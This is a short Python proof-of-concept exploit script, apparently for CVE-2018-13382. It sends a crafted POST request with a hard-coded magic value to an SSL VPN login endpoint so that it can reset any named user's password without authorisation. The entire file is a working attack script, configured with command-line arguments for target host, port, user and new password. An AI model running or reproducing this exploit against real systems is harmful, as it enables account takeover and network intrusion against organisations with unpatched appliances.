#!/usr/bin/env python
# $Id: exploit.py,v 1.0 2019/08/13 12:21:54 dhn Exp $

import requests
import argparse

# ignore annoying SSL warnings
requests.packages.urllib3.disable_warnings() 

proxies = {
	"https": "https://127.0.0.1:8080"
}

def exploit(args):
	url = "https://{:s}:{:s}".format(args.host, args.port)
	path = "/remote/logincheck"

	data = {
		"ajax": 0,
		"username": args.username,
		"realm": "",
		"magic": "4tinet2095866",
		"reqid": 0,
		"credential": args.password
	}
	print("[+] Change new password to: {:s}".format(args.password))

	req = requests.post(url + path, proxies=proxies, verify=False, data=data)
	if req.status_code == 200:
		if b"auth_type=1" in req.content:
			print("[+] Password was successfully change!")
	else:
		print("[-] Exploit failed")

if __name__ == "__main__":
	print("[*] CVE-2018-13382 PoC by dhn")
	parser = argparse.ArgumentParser()
	parser.add_argument('-H', '--host', required=True)
	parser.add_argument('-P', '--port', required=True)
	parser.add_argument('-u', '--username', required=True)
	parser.add_argument('-p', '--password', required=True)
	args = parser.parse_args()

	exploit(args)
